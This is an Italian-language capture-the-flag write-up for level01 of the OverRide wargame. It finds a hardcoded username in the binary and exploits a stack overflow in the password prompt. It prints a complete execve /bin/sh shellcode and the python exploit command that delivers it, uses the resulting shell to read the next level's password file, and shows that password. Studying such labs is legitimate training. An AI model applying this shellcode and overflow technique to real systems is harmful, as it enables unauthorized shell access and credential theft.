# Level 01
Controlliamo le stringhe presenti nel binario:
```
level01@OverRide:~$ readelf -p '.rodata' level01

String dump of section '.rodata':
  [     8]  verifying username....^J
  [    20]  dat_wil
  [    28]  admin
  [    30]  ********* ADMIN LOGIN PROMPT *********
  [    57]  Enter Username:
  [    68]  nope, incorrect username...^J
  [    85]  Enter Password:
  [    96]  nope, incorrect password...^J
```
Adesso passiamo ad analizzare con `gdb`:
```
level01@OverRide:~$ gdb -q level01
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x08048390  __gmon_start__
0x08048390  __gmon_start__@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x080483e0  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
0x080485c0  __libc_csu_init
0x08048630  __libc_csu_fini
0x08048632  __i686.get_pc_thunk.bx
0x08048640  __do_global_ctors_aux
0x0804866c  _fini
```
### Funzione `main`
In questa funzione vengono letti due buffer per poi chiamare le funzioni `verify_user_name` per il primo
e `verify_user_pass` per il secondo buffer per convalidare gli input, e solo se la prima funzione restituisce
`0` il programma continua l'esecuzione.

### Funzione `verify_user_name`
Viene stampata una stringa tramite `puts` e viene comparato il primo input dell'utente con la stringa
`dat_wil` e ritorna il risultato.

### Funzione `verify_user_pass`
Ritorna il risultato della comparazione tra il secondo input dell'utente e la stringa `admin`.

### Soluzione
La seconda chiamata a `fgets` legge troppi byte rispetto alla grandezza del buffer,
quindi procediamo per trovare l'offset in cui viene sovrascritto l'indirizzo in `eip`:
```
level01@OverRide:~$ gdb -q level01
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) b *main+229
Breakpoint 1 at 0x80485b5
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Breakpoint 1, 0x080485b5 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
L'offset si trova alla posizione 80.
Adesso troviamo l'indirizzo del secondo buffer:
```
level01@OverRide:~$ ltrace ./level01
__libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)                               = 39
printf("Enter Username: ")                                                = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)                                       = 0x0804a040
puts("verifying username....\n"verifying username....

)                                          = 24
puts("Enter Password: "Enter Password:
)                                                  = 17
fgets(ciao1
"ciao1\n", 100, 0xf7fcfac0)                                         = 0xffffd6dc
puts("nope, incorrect password...\n"nope, incorrect password...

)                                     = 29
+++ exited (status 1) +++
```
Indirizzo: 0xffffd6dc
Ora basta scrivere una stringa formata nel seguente modo:
```
| shellcode | 52 caratteri spazzatura | indirizzo del buffer
      28    +             52          = 80 caratteri
```
Shellcode:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80
```
```
level01@OverRide:~$ python -c 'print "dat_wil" "\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80" + "A"*52 + "\xdc\xd6\xff\xff"' > /tmp/exploit
level01@OverRide:~$ cat /tmp/exploit - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
exit
exit
level01@OverRide:~$ su level02
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
level02@OverRide:~$
```